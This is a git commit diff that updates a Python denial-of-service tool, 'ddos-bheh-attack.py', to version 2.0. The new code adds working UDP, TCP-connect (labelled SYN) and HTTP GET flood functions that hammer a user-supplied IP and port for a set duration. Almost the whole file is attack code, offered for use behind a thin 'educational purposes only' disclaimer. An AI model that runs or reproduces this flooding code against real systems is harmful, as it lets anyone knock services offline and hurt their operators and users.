9ee34ce8bb2f8e5887172d8439cfc0b6ce9a629a
Black Hat Ethical Hacking <chris@blackhatethicalhacking.com>
2023-01-30 14:58:13 +0200

    Update ddos-bheh-attack.py
    V2.0!

--- ddos-bheh-attack.py
+++ ddos-bheh-attack.py
@@ -1,31 +1,16 @@
+from termcolor import colored
 import sys
 import os
 import time
 import socket
 import random
-from termcolor import colored
-#This is where the magic starts using the power of python
-from datetime import datetime
-from colorama import Fore
 
-
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1337)
-#############
-#Install Figlet
+# Clear the terminal
 os.system("clear")
-os.system("apt-get install -y figlet")
 os.system("figlet Black Hat Ethical Hacking")
+
 print()
-print(colored("Author   : SaintDruG", 'green'))
+print(colored("Author   : Chris 'SaintDruG' Abou-Chabke", 'green'))
 print(colored("Website : https://www.blackhatethicalhacking.com", 'magenta'))
 print(colored("Github   : https://github.com/blackhatethicalhacking", 'red'))
 print(colored("Facebook : https://www.facebook.com/secur1ty1samyth", 'green'))
@@ -36,29 +21,124 @@ print(colored("Twitter : https://twitter.com/secur1ty1samyth", 'green'))
 print(colored("Security is a myth..   : Follow us & Stay Tuned!", 'magenta'))
 print(colored("This tool is written for Educational purposes only - helping the defensive team look into how such attacks take place.", 'cyan'))
 print(colored("BHEH Is not responsible for misusing it and must have an NDA signed to perform such attacks", 'red'))
+print(colored("You are using DDoS-Layer7-bheh Version: 2.0", 'Yellow'))
 print()
-ip = input("IP Target : ")
-port = eval(input("Port       : "))
-dur = input("Time: ")
-timeout = time.time() + int(dur)
-sent = 0
-os.system("clear")
-os.system("figlet Attack Starting")
 
-par = "■"
+# Prompt for target IP and port
+ip = input("Enter the target IP: ")
+try:
+    port = int(input("Enter the target port: "))
+except ValueError:
+    print("Invalid port. Exiting...")
+    sys.exit()
 
-for i in range(0,100):
-    print(Fore.RED+par,end="")
-    time.sleep(0.08)
-while True:
-    try:
-        if time.time() > timeout:
+# Prompt for attack duration
+try:
+    dur = int(input("Enter the duration of the attack in seconds: "))
+except ValueError:
+    print("Invalid duration. Exiting...")
+    sys.exit()
+
+# Function to perform the UDP Flood attack
+
+
+def udp_flood(ip, port, message, dur):
+    # Create the UDP socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    # Set a timeout for the socket so that the program doesn't get stuck
+    s.settimeout(dur)
+
+    # The IP address and port number of the target host
+    target = (ip, port)
+
+    # Start sending packets
+    start_time = time.time()
+    packet_count = 0
+    while True:
+        # Send the message to the target host
+        try:
+            s.sendto(message, target)
+            packet_count += 1
+            print(f"Sent packet {packet_count}")
+        except socket.error:
+            # If the socket is not able to send the packet, break the loop
             break
-        else:
+
+        # If the specified duration has passed, break the loop
+        if time.time() - start_time >= dur:
+            break
+
+    # Close the socket
+    s.close()
+
+# Function to perform the SYN Flood attack
+def syn_flood(ip, port, duration):
+    sent = 0
+    timeout = time.time() + int(duration)
+
+    while True:
+        try:
+            if time.time() > timeout:
+                break
+            else:
+                pass
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((ip, port))
+            sent += 1
+            print(f"SYN Packets sent: {sent} to target: {ip}")
+            sock.close()
+        except OSError:
             pass
-        sock.sendto(bytes, (ip, port))
-        sent += 1
-        print(colored("Packets are being sent like crazy, check if the target is down... we sent %s packets to this Target: %s" % (
-            sent, ip), 'green'))
-    except KeyboardInterrupt:
-        sys.exit()
+        except KeyboardInterrupt:
+            print("\n[*] Attack stopped.")
+            sys.exit()
+
+# Function to perform the HTTP Flood attack
+
+
+def http_flood(ip, port, duration):
+    # create a socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # create HTTP request
+    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
+
+    sent = 0
+    timeout = time.time() + int(dur)
+
+    while True:
+        try:
+            if time.time() > timeout:
+                break
+            else:
+                pass
+            # Re-create the socket for each iteration
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((ip, port))
+            sock.sendall(http_request)
+            sent += 1
+            print(f"HTTP Packets sent: {sent} to target: {ip}")
+        except KeyboardInterrupt:
+            print("\n[-] Attack stopped by user")
+            break
+    sock.close()
+
+
+# Prompt for the type of attack
+attack_type = input(colored(
+    "Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))
+
+if attack_type == "1":
+    message = b"Sending 1337 packets baby"
+    print(colored("UDP attack selected", "red"))
+    udp_flood(ip, port, message, dur)
+    print(colored("UDP attack completed", "red"))
+elif attack_type == "3":
+    print(colored("SYN attack selected", "red"))
+    syn_flood(ip, port, dur)
+elif attack_type == "2":
+    print(colored("HTTP attack selected", "red"))
+    http_flood(ip, port, dur)
+else:
+    print(colored("Invalid attack type. Exiting...", "green"))
+    sys.exit()
